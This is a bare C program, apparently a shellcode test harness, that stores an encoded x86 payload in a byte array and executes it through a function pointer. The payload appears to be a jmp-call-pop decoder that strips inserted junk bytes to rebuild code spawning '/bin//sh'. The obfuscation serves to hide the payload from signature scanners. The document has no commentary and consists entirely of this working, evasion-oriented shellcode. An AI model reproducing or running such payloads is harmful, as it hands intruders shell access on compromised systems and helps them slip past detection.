#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x3b\x5e\x8d\x7e\x01\x6a\x54\x59\x31\xc0\xb0\x01\x31\xdb\x31\xd2\x39\xc8\x7d\x2d\x8a\x1c\x06\x80\xfa\x01\x75\x04\x02\x5c\x06\xff\xf6\xc3\x01\x75\x04\xb2\x01\xeb\x02\xfe\xca\x8a\x5c\x06\x01\x88\x1f\x80\xfa\x01\x75\x01\x40\x04\x02\x47\xeb\xd4\xe8\xc0\xff\xff\xff\x31\x5c\xc0\xd2\x35\x50\x3f\x68\x0a\x6e\x9b\xcd\x66\xfb\xf6\x69\xd7\x67\x19\x68\x31\x69\x26\x66\xff\x1d\x63\xcb\xda\x6f\xa7\x68\xf1\x62\x10\x69\xc0\x9d\x6e\x7f\x2f\x30\x68\x05\xa4\x2f\x1b\x2f\x13\x2f\x64\x73\x25\x59\x89\xdb\x77\xe3\xd8\x0e\x50\x14\xc8\x89\x3a\x36\xe2\x4f\x0a\x53\xc5\x89\x47\xe1\xc6\xb0\x95\x3c\x0b\x54\xcd\x97\x55\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
